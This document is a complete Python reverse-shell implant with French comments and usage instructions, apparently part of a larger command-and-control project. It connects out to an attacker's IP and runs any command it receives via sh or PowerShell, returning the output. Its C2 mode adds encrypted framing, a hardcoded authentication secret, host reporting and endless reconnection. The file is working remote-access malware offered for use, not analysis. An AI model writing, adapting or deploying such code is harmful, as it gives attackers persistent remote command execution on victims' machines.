#!/usr/bin/env python3
"""
LEO — Reverse shell autonome (interpréteur de commandes)
=========================================================

DEUX MODES
----------
1) MODE NETCAT (par défaut) : texte brut.
   Attaquant : nc -lvnp 4444

2) MODE C2 (--c2) : framing + XOR, compatible avec le serveur C2 du projet.
   Attaquant : python -m server.main
               > list
               > use 1
               > shell whoami

QUOI FAIRE (étapes)
-------------------
Cible :
  python reverse_shell.py <IP_ATTAQUANT> <PORT>            # netcat
  python reverse_shell.py <IP_ATTAQUANT> <PORT> --c2        # serveur C2

Attaquant (netcat)    : nc -lvnp 4444
Attaquant (serveur C2): python -m server.main  (puis list / use / shell ...)
"""
import hashlib
import hmac
import json
import platform
import secrets
import socket
import struct
import subprocess
import sys
import time


# --------------------------------------------------------------------------
# 1) Exécution de commandes 
# --------------------------------------------------------------------------
def is_windows():
    return platform.system().lower() == "windows"


def execute(command, timeout=30):
    """Exécute une commande et renvoie (sortie, code_retour)."""
    try:
        if is_windows():
            proc = subprocess.run(
                ["powershell", "-NoProfile", "-NonInteractive", "-Command", command],
                capture_output=True, text=True, timeout=timeout,
            )
        else:
            proc = subprocess.run(
                ["sh", "-c", command],
                capture_output=True, text=True, timeout=timeout,
            )
        output = proc.stdout
        if proc.stderr:
            output += proc.stderr
        return output, proc.returncode
    except subprocess.TimeoutExpired:
        return "[ERREUR] Délai dépassé (timeout)", -1
    except FileNotFoundError:
        return "[ERREUR] Interpréteur introuvable", -1
    except Exception as exc:
        return f"[ERREUR] {exc}", -1


# --------------------------------------------------------------------------
# 2) Framing + chiffrement XOR 
# --------------------------------------------------------------------------
HEADER_FORMAT = ">I"
HEADER_SIZE = struct.calcsize(HEADER_FORMAT)
MAX_MESSAGE_SIZE = 50 * 1024 * 1024
KEY = hashlib.sha256(b"c2_encryption_key_2027").digest()


def _keystream(length):
    out = b""
    counter = 0
    while len(out) < length:
        out += hashlib.sha256(KEY + counter.to_bytes(8, "big")).digest()
        counter += 1
    return out[:length]


def _crypt(data):
    return bytes(a ^ b for a, b in zip(data, _keystream(len(data))))


def send_message(sock, message):
    data = json.dumps(message).encode("utf-8")
    if len(data) > MAX_MESSAGE_SIZE:
        raise ValueError("Message trop volumineux")
    enc = _crypt(data)
    sock.sendall(struct.pack(HEADER_FORMAT, len(enc)) + enc)


def _recv_exact(sock, n):
    data = b""
    while len(data) < n:
        chunk = sock.recv(n - len(data))
        if not chunk:
            raise ConnectionError("Connexion fermée par le pair")
        data += chunk
    return data


def recv_message(sock):
    header = _recv_exact(sock, HEADER_SIZE)
    length = struct.unpack(HEADER_FORMAT, header)[0]
    if length > MAX_MESSAGE_SIZE:
        raise ValueError("Message trop volumineux")
    body = _recv_exact(sock, length)
    return json.loads(_crypt(body).decode("utf-8"))


# --------------------------------------------------------------------------
# 3) Mode netcat : listener `nc -lvnp <PORT>`
# --------------------------------------------------------------------------
def netcat_mode(sock):
    sock.sendall(b"[LEO] connecte. Tapez 'exit' pour quitter.\n")
    while True:
        try:
            data = sock.recv(65536)
        except socket.timeout:
            continue
        if not data:
            break
        command = data.decode("utf-8", errors="replace").strip()
        if not command:
            continue
        if command.lower() in ("exit", "quit"):
            break
        output, _ = execute(command)
        sock.sendall((output + "\n> ").encode("utf-8", errors="replace"))


# --------------------------------------------------------------------------
# 4) Mode C2 : framing + XOR + authentification (compatible serveur C2)
# --------------------------------------------------------------------------
SECRET = "PSK-2027-C2"


def _hmac(secret, nonce):
    return hmac.new(secret.encode(), nonce.encode(), hashlib.sha256).hexdigest()


def c2_mode(sock):
    send_message(sock, {
        "type": "info",
        "payload": {
            "os": platform.system().lower(),
            "hostname": socket.gethostname(),
            "ips": [],
            "vm": [],
            "debugger": False,
        },
    })
    nonce = secrets.token_hex(16)
    send_message(sock, {"type": "challenge", "payload": nonce})
    auth = recv_message(sock)
    if not auth or auth.get("type") != "auth" or auth.get("payload") != _hmac(SECRET, nonce):
        return
    while True:
        msg = recv_message(sock)
        mtype = msg.get("type")
        if mtype == "command":
            output, code = execute(msg.get("payload", ""))
            if code == 0:
                send_message(sock, {"type": "result", "payload": output})
            else:
                send_message(sock, {"type": "error", "payload": output or f"code retour {code}"})
        elif mtype == "bye":
            break


# --------------------------------------------------------------------------
# 5) Point d'entrée
# --------------------------------------------------------------------------
def reverse_shell(host, port, c2=False):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(30)          # timeout de connexion
    sock.connect((host, port))
    if c2:
        sock.settimeout(60)
        c2_mode(sock)
    else:
        sock.settimeout(None)    # mode interactif : recv bloquant
        netcat_mode(sock)
    sock.close()


if __name__ == "__main__":
    args = [a for a in sys.argv[1:] if not a.startswith("--")]
    c2 = "--c2" in sys.argv
    if len(args) < 2:
        print(__doc__)
        sys.exit(1)
    host, port = args[0], int(args[1])
    while True:
        try:
            reverse_shell(host, port, c2=c2)
        except Exception as exc:
            print(f"[!] Erreur : {exc}", file=sys.stderr)
            print("[*] Nouvelle tentative dans 5s...", file=sys.stderr)
            time.sleep(5)